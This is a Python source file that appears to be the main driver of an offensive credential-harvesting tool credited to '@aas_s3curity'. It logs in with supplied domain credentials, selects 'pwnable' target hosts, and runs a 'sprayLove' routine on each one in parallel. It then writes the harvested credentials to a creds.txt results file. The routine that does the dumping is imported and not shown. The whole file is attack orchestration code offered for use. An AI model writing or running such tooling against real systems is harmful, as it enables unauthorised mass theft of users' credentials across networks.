# coding: utf-8
# Author:	@aas_s3curity

# Imports
import os, sys, logging, traceback
from core.User import User
from core.Resources import joinThreads, exit_gracefully
from core.Targets import listPwnableTargets
from core.SprayLove import sprayLove
from core.Colors import warningGre, warningRed, red, blue, white
from core.Utils import retrieveMyIP
from multiprocessing import Process

def run(args):
    jobs = []

    user = User(args.domain, args.username, args.password)
    local_ip = retrieveMyIP()

    try:
        targets = listPwnableTargets(args.targets, user)

        logging.warning("%sLet's spray some love... Be patient." % (warningGre))

        for target in targets:
            jobs.append(Process(target=sprayLove, args=(user, target, local_ip, args.remove)))
            jobs[-1].start()

        joinThreads(jobs, args.wait)
        logging.warning("\n%sCredentials logged into: %s" % (warningGre, os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'results', 'creds.txt')))

    except KeyboardInterrupt:
        logging.warning("%sKeyboard interrupt. Exiting." % (warningRed))
    except Exception:
        logging.warning("%sA problem occurs. Err: %s" % (warningRed, red))
        logging.debug("%s==== STACKTRACE ====" % (blue))
        if logging.getLogger().getEffectiveLevel() <= 10: traceback.print_exc(file=sys.stdout)
        logging.debug("%s==== STACKTRACE ====%s" % (blue, white))
    finally:
        exit_gracefully(jobs, 10)
